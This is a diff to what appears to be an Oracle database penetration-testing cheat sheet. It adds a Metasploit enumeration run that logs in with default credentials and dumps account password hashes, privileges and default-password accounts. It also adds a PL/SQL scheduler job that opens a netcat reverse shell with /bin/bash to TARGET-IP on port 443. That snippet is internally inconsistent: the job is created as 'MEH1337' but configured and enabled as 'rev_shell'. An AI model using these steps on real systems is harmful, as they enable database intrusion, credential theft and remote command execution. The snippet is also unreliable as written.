@@ -187,6 +187,124 @@ msf auxiliary(oracle_index_privesc) > run
 use auxiliary/admin/oracle/oracle_sql
 ```
 
+#### enumerate the database:
+
+```text
+msf auxiliary(oraenum) > info
+
+Name: Oracle Database Enumeration
+Module: auxiliary/admin/oracle/oraenum
+License: Metasploit Framework License (BSD)
+Rank: Normal
+
+Provided by:
+Carlos Perez <carlos_perez@darkoperator.com>
+
+Basic options:
+Name    Current Setting  Required  Description
+----    ---------------  --------  -----------
+DBPASS  TIGER            yes       The password to authenticate with.
+DBUSER  SCOTT            yes       The username to authenticate with.
+RHOST                    yes       The Oracle host.
+RPORT   1521             yes       The TNS port.
+SID     ORCL             yes       The sid to authenticate with.
+
+Description:
+This module provides a simple way to scan an Oracle database server
+for configuration parameters that may be useful during a penetration
+test. Valid database credentials must be provided for this module to
+run.
+
+msf auxiliary(oraenum) > set RHOST 192.168.56.163
+RHOST => 192.168.56.163
+msf auxiliary(oraenum) > set SID KNUTSEL
+SID => KNUTSEL
+msf auxiliary(oraenum) > set dbpass tiger
+dbpass => tiger
+msf auxiliary(oraenum) > run
+
+[*] Running Oracle Enumeration....
+[*] The versions of the Components are:
+[*]      Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
+[*]      PL/SQL Release 11.2.0.1.0 - Production
+[*]      CORE     11.2.0.1.0     Production
+[*]      TNS for Linux: Version 11.2.0.1.0 - Production
+[*]      NLSRTL Version 11.2.0.1.0 - Production
+[*] Auditing:
+[*]      Database Auditing is enabled!
+[*]      Auditing of SYS Operations is not enabled!
+[*] Security Settings:
+[*]      SQL92 Security restriction on SELECT is not Enabled
+[*]      UTL Directory Access is set to
+[*]      Audit log is saved at /u01/app/oracle/admin/KNUTSEL/adump
+[*] Password Policy:
+[*]      Current Account Lockout Time is set to 1
+[*]      The Number of Failed Logins before an account is locked is set to 10
+[*]      The Password Grace Time is set to 7
+[*]      The Lifetime of Passwords is set to 180
+[*]      The Number of Times a Password can be reused is set to UNLIMITED
+[*]      The Maximum Number of Times a Password needs to be changed before it can be reused is set to UNLIMITED
+[*]      The Number of Times a Password can be reused is set to UNLIMITED
+[*]      Password Complexity is not checked
+[*] Active Accounts on the System in format Username,Password,Spare4 are:
+[*]      SYS,03E1E7984F880583,S:3CD57915E74AF162A5ABA3A30FE453E43DF884CB6A552C647B03572BA46D
+[*]      SYSTEM,5A7270D7D12F6BA6,S:EDCB23E4039293C352B12D01EA52F2AF3311B5FA744BE3DCC728BDFE0655
+[*]      DBSNMP,57E9C5ECCAB1777C,S:D9576CA642448980FB5C04D3869614D572E712BF5E019E02C31BBF300E76
+[*]      SYSMAN,CB3E68076FBBAFF5,S:1132C132BFA6686735DEC4398F30DD411F0DDCAAAFCB4AC21527887B7129
+[*]      MGMT_VIEW,23C5225CD5C2C782,S:0983A18B9809980B2ABE7A7A4047E5AA3925DC184C92047B6F5404E8CD11
+[*]      APP_USER,71B0EFF101D0D5AC,S:13BAA4B46E85969429B3242E64E526292EB15BA071E3AAF37649CD3289BA
+[*]      SCOTT,F894844C34402B67,S:7ED8346E4DA9EE29ACBB4A9D08B2E18B57404E6A9A03DB6AF01024BC0B8F
+[*] Expired or Locked Accounts on the System in format Username,Password,Spare4 are:
+[*]      OUTLN,4A3BA55E08595C81,S:8DF2965A946AB7ED6F6657A99B91CC792B67BF873D7CAFD3B20C98A28370
+[*]      DIP,CE4A36B8E06CA59C,S:3E265D395D4D1A637729747CECC8BAD1CD8EFA262A8377E5635BB94434C5
+[*]      ORACLE_OCM,5A2E026A9157958C,S:CDC4C09C00C4A8C25DCD1062BF8EC8BCB468841A1C77AB6E65188DF24D99
+[*]      APPQOSSYS,519D632B7EE7F63A,S:B388B593D8609871990A15E991C82ACA154B0ADDA84E7CB549CFCC6E9B94
+[*]      WMSYS,7C9BA362F8314299,S:A38520037B1C3904B76B3B65E8605DA4F89F710345F60FC7406A3FE9B709
+[*]      XS$NULL,DC4FCC8CB69A6733,S:0327C110E72AE2E82F08AACBBBD385E4589FA1386F20119E1EE2A6AC8DC4
+[*]      EXFSYS,33C758A8E388DEE5,S:BA1BB1B61AA7FE91BFF3CA99A116C2299F2DA8F87398D5560C20B74EDD00
+[*]      XDB,88D8364765FCE6AF,S:7E885EEAC286739730FEDD138F83A361204D96FB92E35FFBDD89A494E32B
+[*]      ANONYMOUS,anonymous,
+[*]      APEX_PUBLIC_USER,E0781A84AA9234A8,S:934C76C08882384A2C51644F9C8302D40D32BFB83524BC4EC9EB84CA0221
+[*]      ORDSYS,7EFA02EC7EA6B86F,S:74C72073718541C8074E24B1210367A6D702C01064580BFF4E5719AD8ECD
+[*]      ORDDATA,A93EC937FCD1DC2A,S:C7267CE01C7CDCD0AF39C4289B7C66A3E0E75EAA3DC47D6143984256A9F1
+[*]      ORDPLUGINS,88A2B2C183431F00,S:554026F9CFABC573E6A7B439716F69AF45A33D969FE7C16AA2E8CF702E34
+[*]      SI_INFORMTN_SCHEMA,84B8CBCA4D477FA3,S:1C2A0B249085C3CEED0B29019231E49F35A56CDB8E0653B1E38E39B5AB8E
+[*]      MDSYS,72979A94BAD2AF80,S:FE9431C8FA6CD61C1741389012B7D7B9ABD4213A612286E83E45F3E50A9E
+[*]      FLOWS_FILES,110F19A4A024EB24,S:EB5CC126B7E3198814CC1B06065AF0E15259706E4036431D15F809527816
+[*]      APEX_030200,A1A70E91605C5567,S:36A4A6B16BC8D55287D3E672FD86D72EA63C3749640A9DD668122E702F1E
+[*] Accounts with DBA Privilege  in format Username,Hash on the System are:
+[*]      SYS
+[*]      APP_USER
+[*]      SYSTEM
+[*] Accounts with Alter System Privilege on the System are:
+[*]      SYS
+[*]      DBA
+[*]      APEX_030200
+[*] Accounts with JAVA ADMIN Privilege on the System are:
+[*] Accounts that have CREATE LIBRARY Privilege on the System are:
+[*]      SYS
+[*]      XDB
+[*]      EXFSYS
+[*]      MDSYS
+[*]      DBA
+[*] Default password check:
+[*]      The account DIP has a default password.
+[*]      The account MDSYS has a default password.
+[*]      The account XS$NULL has a default password.
+[*]      The account OUTLN has a default password.
+[*]      The account EXFSYS has a default password.
+[*]      The account ORACLE_OCM has a default password.
+[*]      The account SCOTT has a default password.
+[*]      The account ORDPLUGINS has a default password.
+[*]      The account ORDSYS has a default password.
+[*]      The account APPQOSSYS has a default password.
+[*]      The account ORDDATA has a default password.
+[*]      The account XDB has a default password.
+[*]      The account SI_INFORMTN_SCHEMA has a default password.
+[*]      The account WMSYS has a default password.
+[*] Auxiliary module execution completed
+```
+
 ### Hydra
 
 brute-force a listener password if exists:
@@ -252,6 +370,22 @@ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 **Remove the exploit using:** 
 
 `drop index exploit_1337;` 
+
+## reverse shell
+
+```text
+Get Oracle Reverse os-shell:
+begin
+dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
+    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
+    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
+dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
+dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
+dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
+dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
+dbms_scheduler.enable('rev_shell'); 
+end; 
+```
 
 ## Resources:
 
